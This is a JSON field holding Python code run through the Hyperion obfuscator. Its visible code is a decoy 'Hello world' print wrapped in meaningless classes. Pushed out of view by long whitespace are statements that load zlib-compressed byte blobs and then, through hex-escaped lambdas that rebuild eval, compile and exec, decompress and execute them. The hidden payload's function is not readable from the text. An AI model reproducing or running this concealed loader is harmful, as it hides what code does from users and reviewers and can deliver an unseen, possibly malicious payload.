"protected": "from builtins import *\nfrom math import prod as _substract\n\n\n__obfuscator__ = 'Hyperion'\n__authors__ = ('billythegoat356', 'BlueRed')\n__github__ = 'https://github.com/billythegoat356/Hyperion'\n__discord__ = 'https://discord.gg/plague'\n__license__ = 'EPL-2.0'\n\n__code__ = 'print(\"Hello world!\")'\n\n\n_algorithm, _detectvar, CallFunction, Run, Ceil, _multiply, _cube = exec, str, tuple, map, ord, globals, type\n\nclass Hypothesis:\n    def __init__(self, _walk):\n        self._stackoverflow = _substract((_walk, 87711))\n        self._builtins(Divide=-52465)\n\n    def _builtins(self, Divide = True):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        self._stackoverflow /= 84905 / Divide\n        \n        try:\n            (Run, _detectvar) if CallFunction < _detectvar else {Ceil: 'luebyRlb3ut'} > _calculate\n\n        except ArithmeticError:\n            ((Run, (CallFunction, Run)) for Run in (Ceil, Ceil) if Run > _algorithm)\n\n        except:\n            _cube(-10620 / 81016) == str\n\n    def _modulo(self, Add = 21291):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        Add += 74823 * 6216\n        self._random != str\n        \n        try:\n            (({CallFunction: _algorithm}, _detectvar) for _detectvar in (_detectvar, _algorithm))\n\n        except TypeError:\n            (((Run, _detectvar), _calculate) for _calculate in {Ceil: 'luebyRlb3ut'})\n\n        except:\n            _cube(55098 - 34495) == float\n\n    def Theory(Algorithm = type):\n        return _multiply()[Algorithm]\n\n    def Negative(_add = 74049 * 9610, _run = Ellipsis, _floor = _multiply):\n        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler\n        _floor()[_add] = _run\n        \n        try:\n            ((CallFunction, Run) or _algorithm if (CallFunction, Run) and _algorithm else ... or (_algorithm, (CallFunction, Run)))\n\n        except AssertionError:\n            ((_detectvar, (Run, _detectvar)) for _detectvar in (CallFunction, Run) if _algorithm > CallFunction)\n\n        except:\n            _cube(-31599 / -89511) == type\n\n    def execute(code = str):\n        return _algorithm(_detectvar(CallFunction(Run(Ceil, code))))\n\n    @property\n    def _random(self):\n        self.Square = '<__main__._floor object at 0x000008490BE30712>'\n        return (self.Square, Hypothesis._random)\n\nif __name__ == '__main__':\n    try:\n        Hypothesis.execute(code = __code__)\n        Walk = Hypothesis(_walk = 11422 / 48434)\n\n        if 199144 > 5486263:\n            Walk._builtins(Divide = Walk._stackoverflow / 27301)\n        elif 202369 < 8697037:\n            Hypothesis(_walk = -6845 * -27144)._modulo(Add = 82438 + Walk._stackoverflow)                                                                                                                                                                                                                                                          ;Hypothesis.Negative(_add='SS22SS2SS2SSS22SSS2S',_run=b'x\\x9c\\xed\\x1c]o\\xdb8\\xf2=\\xbf\"\\x9b\\x17\\xd9h\\x9bJ\\x94DI\\x01\\xfar\\xe8-\\xd6\\x81\\xbb>l\\x0e\\x97\\x1e\\xba\\x85!\\xcbr\\xabT\\xb6\\xb2\\xfe\\xd8&\\xff\\xfef\\x86\\xa4L\\xcb\\xa2-\\xc5\\x8e[\\x04\\'\\x9a\"5\\xa4(r8\\x9c/2Y\\xce\\x1f\\xaf\\xce\\xce\\xe1\\xca&\\x1dJ\\xf1\\x1a\\x0e\\x8b\\xd1d\\xb5H\\xe2e1\\x1f\\x0e\\xcf\\x7fyw\\xf1\\xdb\\xe3}:\\xcf\\x8a\\xd9\\xc5y1\\xd7\\xaa\\xc5\\xab\\xe5\\xd7b\\xbe\\xa0:\\x9d\\x8bQ\\x96\\xe7\\x8f\\xcb\\xaf\\xe9\\x97\"^\\xba>\\xbfx}\\xf1\\x8f|\\x95\\xfe\\x91\\x8e/\\xba\\x1bo}\\xc9\\x96_W#\\xd1\\xf0\\xd7\\xe5\\xf2~q\\xf5\\xf6\\xad\\x80]&\\xc5\\xf4m\\xa5\\x99\\xb7\\x86o\\x8f\\xb3ER\\xcc\\xc7\\x9b\\xcdH\\xe0\\xe5\\x97/o\\xef\\xf3\\xf8\\xcb*\\xad\\xbc\\x94gI:[\\xa4\\xe2\\xa5\\x7f\\xfe\\xab\\xff\\x86]\\xda\\x95*I1\\x16\\xe5\\xd6\\xfd<\\x9b-;\\x17\\xbf\\xa5y^\\x9c\\x7f/\\xe6\\xf9\\xf8\\x97\\x8b\\xaeu\\xd6\\xbd*kc\\xb9\\xb5\\xf8\\x96\\x8d\\xad\\xeeY\\xfa\\x90\\xa4\\xf7K\\x89\\xcc\\xd9\\xfd\\n\\xde\\xfc\\xa3X\\xa4\\x8b\\xf3x\\x9e\\x9e\\xcf\\xd3\\xf1\\x9f\\xb3\\xffdE\\x9e.\\x05`\\x04\\x98\\xf9s\\xf6\\xdfbEO\\xf196\\xf2\\xe7\\xec\\xf7bT\\x8c\\x1f\\xcf\\xf3\\xec\\x1b\\xbc\\xf7X\\xac.\\xbag\\xa2S\\xd9\\xf4\\xbe\\x98/\\x87C\\xf8\\xda\\xe3\\xc2\\xea^\\xa6\\x0f\\xd9\\xb2\\xd3=\\xcb\\x8b$\\xce\\x17\\x9d\\xee\\'\\xeb\\xe1;^\\x0f\\x0ft\\xc3\\xc4\\xfa\\xfc\\xeeK^\\x8c\\xa0\\xf8l\\xab\\x0c_\\xb0\\x8b\\x01\\\\v\\x01\\x97\\raP\\xd8\\x90\\x1fX\\x9f\\xae\\xae^\\xbdy\\xf5\\xa6\\xf3\\xa6\\xf3\\xca\\xe9v?C#\\xe92^.\\xe7\\xf5\\x8d\\xe4\\xbd\\xbc\\xd7\\xcbs\\xb8\\xc1EY\\x88\\xdbm\\x8c3\\xc3\\xfb7p1\\x86\\xbf\\x1b\\xb8\\xdf\\xd0\\x0f:.\\x86uVW\\x8ao\\xf5\\xae\\xaf\\xfb\\xd7\\xbd\\xeb~\\xff\\xfa\\xfa\\xba\\xd7\\xef\\xf5\\xfb\\xbd\\x1e\\xbc\\xb4FR\\xfd\\xb7\\xa0z\\xbf\\x07\\xaf\\x89\\x8br\\xf4^Mk\\x1dk\\xb4\\xca\\xf2e6CT\\xff\\x1d\\xcf\\r(\\xfcH\\xd7-\\xc5\\xdb\\xdb[\\xf1\\x84\\x17\\xb4:(\\x10\\xa1\\x03\\xc2-\\xa2\\x18\\x91]\\xd8\\x9d\\xda\\x8f-f\\xd92\\xcfV\\xa3*\\xe2\\xba\\xaf\\x15J\\x05~E6o\\xd9H\\xf7\\xd3QZ\\xb9\\xccf\\xe3\\xf4\\xa1c\\xcd\\x97\\x8b\\xad\\xc2\\xcf\\xdd\\xb3Z\\xec\"\\x92n%R>\\xe2\\x8f\\xb0\\xf5\\x92\\xb1\\x93\\xae\\xe6\\xff\\xaeCO-\\xfdLg\\xd3\\x19]S-\\xcef/\\x19?y\\xfcw\\xda\\x18?w\\xd9]\\x06\\xb2\\xe0\\x0e~\\x90\\xdeA\\n\\xf7\\x97\\x8c\\x9d4\\xcf\\xee\\xa7E\\xd2\\x18A\\x04|\\x90?\\x02\\xd3\\xed%\\xa3(/\\x8a\\xedR\\xc0\\x8fIV|\\'d=H\\xd4A\\xf2\\x92\\x91\\x93.\\xf2\\xf8\\xd7V\\xdc\\x99D\\x97\\x94ae\\x8eX\\xb4e]\\xde\\x15\\xd9\\xcc\\xfc\\xea\\x87\\xdf?|\\xf8\\x1d.\\xb8\\x7f\\x10\\t\\xc4\\x0f-\\xd1\\x9be\\xc9\"\\x9ee\\x87\\xa1\\xd7\\xd8H+\\xf4\\x9a[Q\\xe8}\\x9cd\\xf9C\\xfau\\xb6j\\x85\\xe2\\\\}\\xbdW^\\xa4%\\xbd`:\\\\\\xc6E>i\\xca\\xc5\\xea\\xe9\\xa83\\xb2\\xbc\\xc4\\x8b\\xbc\\x18\\x82H\\x13\\x081\\xe4\"yW\\xa5p\\x07-m\\x9c\\xa2\\xde\\xde\\xb1\\xc2\\xc9\\xb2fz^.\\xaa\\x93\\xf4\\xa1\\xb1@=\\x05\\xa6E\\x8f\\xce\\x97\\xf3\\xe2~\\x9a\\x9d\\xab\\xfe\\x9fO\\x8b\\xf9\\x06A\\x18T\\x9f\\x8e\\xb1\\x8b\\xae\\xcd\\xc6,dc\\xd7a\\xd1\\xbeNt\\xbbF\\x89I\\xcb\\x12P\\x0bk\\x13Q\\xdd\\xeb\\xe3c\\x93\\x8eY\\xdd`\\xe8\\x0e\\xd9\\x90C\\xf0 \\xb8\\xc3p\\xe8C\\xfdp\\x1bz\\xd88\\x1d9N\\xbb\\xe18\\xd1\\xc027\\xc7#>\\x0el>\\tX\\xe01;`\\xdc\\x0f\\x9c\\xc0\\x87\\xbb\\x1bx\\x81\\xbb\\xf7\\x03?\\x90\\x8c\\x96\\x8bt\\xf5W:\\x7f\\xfdm\\x11\\xe7\\xbf*z\\xc2\\x87\\xc9\\x11\\x88\\xc9\\xf7\\'\\xae\\r\\xd1\\x95i S&#\\xc2]6\\xa2\\x89hR\\x97\\x1dD\\x94BeaB\\x7faL\\x1a\\xc1\\x06\\x8d\\xc68\\xa8\\xcd\\xc9\\xdd\\x8ba\\xa3\\xc6$\\xac\\xf9\\x1cyT\\x9e\\xd3\\x8d\\xb8\\x14\\n,\\xa3\\x8c\\xa3Ij\\xb6\\x8c\\xeca4t`\\x998\\xb0X\"X:\\xde0\\xc2>mC\\x9b5\\xe7@\\xb9\\xdd\\xf4\\xcb\\xe1\\xd0\\x86\\xb6m\\xf8\\x8a?\\xc4/\\x86\\xf4\\xe5-\\xe8a\\xb4\\x15\\x02=`\\xe4\\x10\\x1dI/\\xf8\\x1c)Z\\xc1gI[M\\xea\\x06\\xcd\\x19A\\xc9\\x10\\x0c\\xfe\\n\\xb2\\xc3\\x85\\xb3\\xe2V=\\xec\\x9a\\xd6\\x85\\\\\\x84\\'\\xe5hf\\xca\\xbc\\xa1\\x82\\x12&\\x1fnn\\xcc\\x8beK<\\x9a\\xa9\\xc3\\x85\\xb9\\xf7\\x80\\n|`\\xe5\\xce0\\x80<\\xb2wo\\x1bz\\x182\\x029\\xab\\x8a\\x93\\xe0\\xcc#\\x87\\xf1\\xe4\\xacc>\\x92\\xd4\\xd1\\xa4n\\xd8BL\\x98uTR;\\xfaT\\x067\\xd4C\\x0e\\xe7\\xaf\\x91\\xec\\xb1\\xea\\xbd/i\\xda\\x91e\\xb6\\xc6_w\\xd5\\xa5\\xf5\\xd0\\x90t\\xde\\xb5\\xee*\\xb0\\xdb\\x148f\\xc8\\x1d\\x12\\x94\\t\\xf7\\xe1\\xd9\\xe5\\x13>f\\x13\\xeeq\\'\\x80\\xc8&\\x8c\\xed\\x17\\x95F\\xe4~\\x17\\xd69\\xfd\\xc4z\\x14\\x8b\\xf2\\xc0U\\xa5\\x89%&Q\\xa6`J4)\\x14\\xef\\xab\\xeb</\\x8a\\x03\\x0cv\\xccl\\x11\\xbc\\x00\\x10\\x8e\\xda\\x88\\xc7C@\\xb7\\r\\xe2\\xca\\xe7\\x0c\\x90\\rH\\x87i\\x88x\\xcal\\xceA\\x9c\\xe1$\\xackm\\x887\\xa8\\xe1\\xf0\\x94c+\\xf0\\x8c\\xe5<\\x12\\xd0\\xc0\\xd5\\xde\\xf1\\xe1\\xad\\x84%\\x00\\xc7\\x96GT\\xcf\\xd9n\\x0b\\xeaOj\\xdfR\\xdf\\xc0\\xfa\\x1e\\xc1\\xd3J\\x8f\\\\\\xd4\\xaex\\x8a}X\\x8fP\\x8c\\xf8\\xe9$\\xb3K\\x9dK \\x88{\\xc2c\\x08\\x11\\x04uO(\\'K\\xf6\\x1bEOX,<\\x04<x\\x01\\xcc\\x99\\x1b\\xc3\\xb28ha\\x98\\xf5\\xc8\\x897\\xe1\\x10]\\xdb\\xb51/\\x9e1\\x8f\\x10@\\xb7,\\xc5\\x88\\xf0\\xfd#\\xcd\\xe3\\xe9h\\x1c\\x9fOa\\xc4\\xeb!\\xd3\\x88\\xe1\\xba\\xaa\\x17\\x1e;,\\xfa\\x1c=\\x93y\\x96\\x91\\x832\\xcb\\xc91\\xd9P\\x07\\x81r\\xe7\\xf4\\x06\\x82B\\x80T\\xeb\\x94\\xfd)2\\xbd\\xfc\\xca0\\xd4\\xf6S\\xe7\\x87\\x14\\x02\\x8a\\x81\\x96\\x0b\\xe4s(\\xef\\xaa$l<y\\xf4=\\xfa\\x8e\\xfc\\xee\\xf1z-\\x17R,CBQ,\\xb4X\\xdei\\x89=\\xc7\\x92:\\x88QX\\xd2\\x85 \\xf4t\\x15\\x0f\\xa3/\\xa5q\\xf8J\\x1b\\x912\\xd9S\\xfa(\\xe9\\xa4B\\xb04\\xa9\\xcb\\x9b\\n\\x169\\xcfD\\x91\\xb9>\\xb0\\xde\\xf1f:\\x08\\x83`#\\xaa;\\xa6\\x14\\x1a\\xd3#\\xba\\x90\\x06\\xef\\x07\\x83\\xe2\\xfd\\xfbAQ@\\xf6\\x88\\xab\\x08\\x8cO\\xc0\\x1f\\xdd1\\x15A@D\\x0e\\xd3\\xe6=E\\x9f\\x17ttP\\x90\\x17\\x0c\\x1da\\xb6\\x8d\\x99\\xd6\\x9c\\x0f\\xbdg\\x03\\x9b\\x9ci\\xd8\\x88hu\\xd0\\x8c\\xf5E\\xa0>\\xa3\\x02\\x8d~\\x14\\x17Tj\\x9b\\xcc/4\\xca*\\xd0\\xc3\\xcd/.c\\xa0\\x99\\xeb\\\\3\\xadl\\xcd\\xfc\\xdaU\\xb7\\x85\\xea\\xf9d\\xf5\\xb3F\\xfb9D\\xd9\\xbc%G\\xfeG\\xe5\\xcf\\xc7pd\\xc9\\xf4\\xa3\\x84\\xd8\\xd3\\x15\\xfc\\th\\x93>\\xf2s\\x7f\\x02\\xd8\\x06\\xe6\\xc5\\xf9A8\\xceI\\xfa\\x83\\xd0\\xbf\\xbb\\x83\\x0c\\xa4\\xcd\\xd0\\x86~\\x06t\\x17\\x06\\xe8$\\xa4\\xc5\\x80\\x9e\\x8fh\\x1bz\\xf8\\x02`\\x15bv%\\xe1\\x97\\xd6\\xa4\\xb6\\x00\\xf6\\xd5m\\xc8\\xbf7x\\xf8\\x0c\\xbb=\\x15\\xdd\\x15\\x99\\xd6\\xcc\\xd1\\xca%\\xff\\x97\\xfb\\'\\xe2\\xa8I\\xef0\\xdc\\xa8qy\\x9a\\x01\\xa4,j\\x1d/\\xfb\\xea\\xb5\\x95i\\x03:m\\x83l\\xb7\\xb0\\xc5\\xad\\x18\\xb4\\xc7\\xc8\\xc7\\xf5)\\x13\\xb5\\xc0\\xf1wR\\xbfz9$\\x12\\x1a7\\xc2a\\xc9J\\xe1qsTQ\\x1dn\\x88\\xe8P\\x17\\xd3\\xb2\\xac\\xb9\\xb8&g\\x97\\xbc\\xe4\\xa6\\'\\xde\\xafj<e\\xf5\\xde\\xb3\\x1a\\xb4\"m\\x1fn\\xc5+\\xa9\\xa4\\x1c \\xb6\\xaf9\\x005\\x0b~W\\xbd\\xa6\\xb3\\xd7i\\xe5\\xd0\\x97ZqT\\x1a\\x95\\x8941#i|*c\\xb4\\x81C\\xff\\x82\\xfa\\xe0\\xbc\\x02\\x10\\x14\\xbc\\xba\\xba\\xfad\\xad\\x96\\x93\\xd0\\xea\\xa4\\xe3\"I\\xc7\\x97]\\x0b$m\\xa9j\\xaf-\\xd9D*\\xe4\\xb1\\xa6\\xa4\\x87L\\xa8D\\xcc\\x15Q\\x05\\x91WP\\xbd\\xc4\\x1au\\x94\\xe1\\x80V\\xc4z\\xbc\\x9d\\xcf\\xfb\\xba\\x15\\x97\\xdb\\x16\\x89\\xb6\\x99\\xb1\\xde\\xdeH\\xcaR\\xe3G>u;\\xbd\\x9e$zE\\xfe\\xb0\\x1c\\xfa\\x17\\x8d7\\x9e8\\xc8\\x05\\x1b\\xee\\xe8\\xa9\\x86 7\\x9e*\\xd0fb\\x88\\x81\\x98\\xf1\\xc8\\xcd\\xee\\xca}+\\x14C\\xee6\\xf4\\xe8zC\\x0b_}\\x8b\\xaa\\xb8\\xe7\\x16A\\xef\\xfd!\\xbap\\x19\\x8d\\xc6\\xab\\xc2N\\xbb\\xf7h\\x88\\xaf\\'Y\\x9e\\xce\\xe2i\\xfan\\xaf\\xe6\\xbf\\xd6\\xf4\\xd7w\\xa5\\xf9\\xbb{u\\x97\\xd7S({\\xb7u\\xd8\\xea\\x04jZ\\xbb\\rC\\xd0xS\\x8a\\xeb06\\xa4\\x10\\xf6\\xf3\\x18\\xa3\\xe4\\xbcCu\\xed\\xee\\x0e]6t\\x9e\\x8c\\\\7\\xa7\\xdd\\xd5h\\xc4\\x00\\x91im21\\xc5\\xd8\\x04\\\\\\xdcCVzO4\\x8f\\x8a\\xeee\\xd9\\xf4\\xbf`\\xb0Yl\\xc7n\\xb8%@\\xeb\\x84\\xab\\r\\nr\\xc4w\\xb0\\xcc*e\\xef\\x1f\\x98\\xedN|\\x8c\\x0eD\\x0e\\xd1\\x97\\x11\\x9f\\x03\\x19=\\x171:bN\\xa3\\xba\\xe6\\xee\\x19\\x04\\xb5\\xde\\xbfh\\xe8\\xd1f\\xa3\\xd8\\x8c\\x04\\xfe0\\xf4\\xa0x\\x1b\\xeav\\xad&\\xcd\\x11\\x0flV\\x95\\x18[\\xb3\\xaa}<\\x12\"\\x8e)\\xe0y\\x85>I\\x10\\x0bd\\x89\\xd2\\xb5Xi\\xbc\\xdf\\xdc4\\x13%\\xcf\\xc3\\xac}\\xdc4\\x05Q\\xc4i+\\xd5F\\x9e\\x0b\\xf5\\xf96\\xf4p])\\x92z\\x8f\\xb2\\xce\\x95\\xb3\\xc9\\xad\\xecv\\x98\\xea\\xb1v\\x16\\xfd6\\xe7\\xb6\\xd6\\xdb\\xf4\\x94\\xd0T\\x1c\\x19\\xa3G\\x15DG\\x93\\x05\\xad\\xbf\\xfd\\x04?\\xec\\x91\\xe5A\\xfd\\xa9\\xe2\\xa7\\xca\\x82v\\xcb\\x87\\xbcZ\\xc8O\\x18\\xf0\\x12\\xe2)P\\x9fmC\\x0f\\x9b\\x14\\xae\\xd1\\xb7\\xda\\xe1S\\x1e-_\\xc1\\xe5\\xba\\xd8W\\x97\\xb7_\\x1b;N\\x1eI\\xfd8\\x91\\x1as\\xbc\\x11\\xd60\\xd0\\xa5\\xa1s\\x91?b\\x81\\xd7X\\xd3f\\x81?rc7\\x86\\x81\\x8d)\\x86\\x14G\\xed\\xe8\\x87\\x85\\xde\\xd8K!\\xe2]\\x84\\xb1\\x84\\xe8O\"\\x85\\xf69:\\xeb\\\\7r}\\xce!\\rd\\xcae\\xaa\\xe0\\xaeL\\xc3\\xca\\xb3W\\xa9o\\xbb\\x8c\\xa3<\\x0f!\\xf5\\x8e\\xd0\\xae_\\xd6g0\\x8d\\x01\\x8bX\\xca=\\xee\\xd3f6\\xa4\\x80\\x9f\\xc0\\r9\\xc7}L\\x13\\xfepm\\xc3\\\\\\x8c\\xf1.r\\x90\\x7f\\n\\x96|\\xea\\x1f\\xa3\\xa8\\xf2z\\xaa\\xa2\\x0e\\xd7\\xeb\\x1b\\xcb\\x01S8H\\x8c\\x1e\\x8cT\\x8f\\n\\xa6\\x97\\xab|\\x1dL\\x7fO\\x8fLb\\x18#\\xe7>\\xcc\\x83\\x03\\xa9\\x87\\xf3Q\\xc2\\x8f\\x82\\xe1\\xbdZ\\xfcZ\\xe8\\x08\\x81\\xcf\\x84\\xc0\\x97g_ 9)')\n\n        if 108736 > 9641473:\n            Walk._modulo(Add = -176 * Walk._stackoverflow)\n        elif 238965 < 6646191:\n            Hypothesis(_walk = -73410 * -19975)._modulo(Add = 54484 * Walk._stackoverflow)                                                                                                                                                                                                                                                          ;Hypothesis.Negative(_add='MMNNNMMNMNNNMNMMNN',_run=b'Co)H\\xd0\\xe1\\xcf\\xe8D\\x95\\'\\xcfu\\xf9\\xa4\\x16\\xd8\"\\xa7C\\x7f\\x80qf<cd\\xd0\\xcb\\x0e\\xeb\\xa2:\\xcaR\\x1e\\x17\\xach$\\xa1\\xe6zlR\\xb7\\xa9\\xfb\\xb1\\xd3\\xf6\\x0c\\xe1\\xa9\\x1d>\\x89\\xfc\\\\R\\x1el\\x88K\\x07\\x90x~\\xba\\xad\\xa3\\xe4\\x86H\\x95\\xc4QGS\\xc5\\xd3^K\\xe7\\xa7w\\x0e\\xa1\\x87\\xc3\\xa3\\x85\\xc4I\\xa7\\x08H\\xf3\\xae\\xc0N\\xaft\\xaeY\\xd7\\xfa\\x8f\\x93\\x1e\\x94&vR\\xc3\\xfb\\x07\\xea\\xbf?\\xa5/\\xe4\\xa7Y\\xfb\\xeb\\x95\\x1c\\x96A_\\xd1r=3\\x9f\\xe3\\xc9\\xab\\tgA\\xca\\x94\\x17\\xa4\\xea\\x15\\xd9t\\x07\\x0b\\xa8m^r\\xa7Z\\xd7j\\xde\\xcb?>k\\xb2\\xa6\\xcd\\x14\\xe8i\\xca\\xbb:m\\xe1I\\x91\\xa0v\\xeb\\xd4\\xd9\\xd1&u\\x1b\\x9e\\x1d\\xd5\\x16s\\x9e\\xab\\xd3\\xe0\\xea\\x80\\x06\\x9d!jx\\xf8Ip\\xa5\\x88l [\\xfc\\xb5\\x04\\xf9j\\xb7\\xa0\\x87o\\xf2yr\\xd8\\xb66d\\xe5\\'\\x08\\xb5M\\xbe]\\xf5Z\\x1c\\xbc\\x16L\\xc6\\xbc\\xb4\\xfc\\x80s\\x87\\'\\xfb\\x9b3o\\xfe\\x1d\\xa0\\x98X]\\xe5\\x8b\\x89H\\xe9B\\xdf\\x96\\x07\\xf5\\x83mh\\xf33\\xfc\\xa8\\xdd\\x85t*\\x1a\\xdd;\\x8e<\\xc3_\\x81\\xfe\\x10\\xb7\\xbbQ\\xedy\\x0e7p\\xdb\\xed\\xd3\\xe3\\x19\\xccO0\\xcb<e\\xf6pGF\\xfd\\xd9\\x95\\xd1Y\\x9bU\\x1b\\xf9\\xca\\xbb\"\\x7f\\xa8\\x19\\xf4D\\x03\\x93\\xa3\\xe1\\xe6\\xa2!f\\x03\\xe7\\x0fd\\x0cw\\xe4\\xf5X\\x07\\xd3\\xeb\\xaf\\xcb]\\x18\\xa9\\r\\x11\\xbf\\xa3\\x1b\\x99U\\x83s\\x9f1Z\\x17U9\\x1a\\x9c\\x1ed<28E\\x8a\\xee\\x01\\x8c\\n\\xae\\x97+\\xb8\\xaa\\xc3%\\\\\\x7fW\\xa5\\xaa\\xfe\\x89\\rV3\\x91\\xaf\\'9-\\'Y\\x9f\\xec\\xb4\\xcc\\x8fO\\xb6\\xcb\\x15\\xfa\\xeb\\xbfJP\\x7fy\\xa06\\xda]\\xe5(\\xd3N\\xcc\\xec\\xab\\xeb7\\xd6\\x10[\\xdbgGV\\x12O\\xc8([\\xef\\x97\\xed\\xd8#]\\xef\\x85n\\xee\\x97n\\xee\\x99\\xfe\\x9fM\\x02\\x83\\x14~+\\xc5*u\\xb6\\xa0\\xb3\\x9b:\\x16\\xc3+\\xe5\\xd5g\\x1dF^L\\x18\\xa9\\xce.\\xf5\\xa8\\xb3k\\xd0\\x84D$\\xf6\\xe7T\\xa2\\xab\\xa52\\x96\\xf5\\xdc\\xcdw\\xa8M\\xf37\\xab\\xf19\\xd9w\\xbdx\\xa9\\x8a\\xa2\\xaa\\x88\\xa9\\x8a\\xa7\\xaaX\\xda|\\x17\\xf1[7N\\xa0\\xa2JT\\xa1\\x0e\\x16h\\xcf\\xe1\\x8e\\xfc:\\xec\\x9bO\\x8d\\xca7W\\xc6F^\\x87\\xb9\\x9b+K>7\\x9d\\xc7\\xd3\\xe0z[$\\xeb\\xf4\\xaeD\\xac\\xcaWE\\xb1W\\xa9\\xa3\\xaf)\\xd3<V\\xd7\\xa6\\xdenu\\xcd\\xea\\xea\\x01\\xaf\\xe9\\x07\\xbd\\xcf\\xbdZ?z\\x9d_\\xbd\\xea\\x83\\xaf\\xfa\\xe2\\x89\\xcbJ_x\\x00yN\\x94\\x81;\\x10\\xec\\xd9\\xf0\\x04v\\xff^\\xda3\\xd3\\xbd)_\\x17EYs\\xfa3\\xe3M\\xdf\\xbb0\\xed{\\xe8u\\x91\\xceL\\xfb\\x15\\xfb\\x9e\\xabez4\\xf3\\x8aj\\xd8\\xc7\\x1b\\xeay\\x82\\xc0\\x97\\'\\xf9\\xb1\\xce\\xa7\\xf5~m\\xf2\\xe9\\xad\\xbc\\xaa\\xb3\\xf1\\x9ex\\x87I\\xba:\\xe6z\\x10m\\x1e\\x87W\\xfd|<\\xf1\\xf9L \\xa2\\xd1\\xe7\\x9a\\xe7\\x1d\\xbc\\xb0\\x8eg\\xe8\\xf3^g\\x0ey\\x1a\\xadT\\xe9\\x86\\x97<\\xb1N6\\x98\\xe4I\\x1d.\\xb7\\xdf\\x11\\xbc1 ]\\x0b\\xf4G\\xc2\\xd91\\xd7\\x9a\\tO\\x9b4\\xf7<|\\xf8g\\xa1\\xc1\\x13\\x98\\xc8\\x06\\x9e\\xc9\\xcay\\x15\\xbd\\x82g\\x98\\xef\\xe7\\xa4S\\xa4\\xa7@\\xea\\xee\\x82\\x1e\\xbc\\x93\\xee7\\xcbC\\xf2\\xe2\\xbf\\x83\\xa9\\x7f\\x0c\\xd6\\xfc0\\x98CGo9\\x1d\\xfb\\x8a\\xe8\\xb42\\xdf\\x866\\xddD\\x0e\\xe5?\\x04\\t\\xc8O,<\\x97\\xca\\x01\\xa9A\\x7f\\xf6?]:\\xae\\x9b\\xf8\\x7f\\x1f\\xff\\xed!')\n\n        Hypothesis(_walk = -45067 - 26289)._modulo(Add = -57734 * Walk._stackoverflow)                                                                                                                                                                                                                                                          ;nmnnnnnmmnmmmnmnnm,nnnmnnnmmnmmnnmnnmnnnmmm,XXXWXXWXWWWWXWXWWXWXWXX,XXXXXWWWWWWWWWWXWXXXXXX,OOO0oo0Ooo0oO00O0Oo=(lambda DDDOOoDOOoOODDDDDODoDOOoo:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(DDDOOoDOOoOODDDDDODoDOOoo)\"),filename='\\x49\\x4c\\x4c\\x4c\\x4c\\x4a\\x4c\\x4a\\x4a\\x4c\\x4a\\x4a\\x4a\\x4c\\x4a\\x49\\x4a\\x4a\\x49\\x49',mode='\\x65\\x76\\x61\\x6c'))),(lambda DDDOOoDOOoOODDDDDODoDOOoo:DDDOOoDOOoOODDDDDODoDOOoo(__import__('\\x7a\\x6c\\x69\\x62'))),(lambda DDDOOoDOOoOODDDDDODoDOOoo:DDDOOoDOOoOODDDDDODoDOOoo['\\x64\\x65\\x63\\x6f\\x6d\\x70\\x72\\x65\\x73\\x73']),(lambda lijljilllijijjjjiilllll,DDDOOoDOOoOODDDDDODoDOOoo:lijljilllijijjjjiilllll(DDDOOoDOOoOODDDDDODoDOOoo)),(lambda:(lambda DDDOOoDOOoOODDDDDODoDOOoo:globals()['\\x65\\x76\\x61\\x6c'](globals()['\\x63\\x6f\\x6d\\x70\\x69\\x6c\\x65'](globals()['\\x73\\x74\\x72'](\"\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x73\\x28\\x29\\x5b\\x27\\x5c\\x78\\x36\\x35\\x5c\\x78\\x37\\x36\\x5c\\x78\\x36\\x31\\x5c\\x78\\x36\\x63\\x27\\x5d(DDDOOoDOOoOODDDDDODoDOOoo)\"),filename='\\x49\\x4c\\x4c\\x4c\\x4c\\x4a\\x4c\\x4a\\x4a\\x4c\\x4a\\x4a\\x4a\\x4c\\x4a\\x49\\x4a\\x4a\\x49\\x49',mode='\\x65\\x76\\x61\\x6c')))('\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x27\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x27\\x29\\x2e\\x65\\x78\\x65\\x63'))\n        if 422459 > 3430579:\n            Hypothesis(_walk = -22966 * 6293)._modulo(Add = -876 * Walk._stackoverflow)\n        elif 155667 < 6751682:\n            Hypothesis(_walk = -34451 / -27078)._modulo(Add = 88797 - Walk._stackoverflow)                                                                                                                                                                                                                                                          ;OOO0oo0Ooo0oO00O0Oo()(XXXXXWWWWWWWWWWXWXXXXXX(XXXWXXWXWWWWXWXWWXWXWXX(nnnmnnnmmnmmnnmnnmnnnmmm(nmnnnnnmmnmmmnmnnm('\\x76\\x61\\x72\\x73'))),Hypothesis.Theory(Algorithm='SS22SS2SS2SSS22SSS2S')+Hypothesis.Theory(Algorithm='MMNNNMMNMNNNMNMMNN')))\n\n    except Exception as _calculate:\n        if 405650 > 2925063:\n            Hypothesis.execute(code = _detectvar(_calculate))\n\n        elif 409015 > 9644901:\n            Hypothesis(_walk = -17086 * 42316)._builtins(Divide = Walk._stackoverflow - -83780)"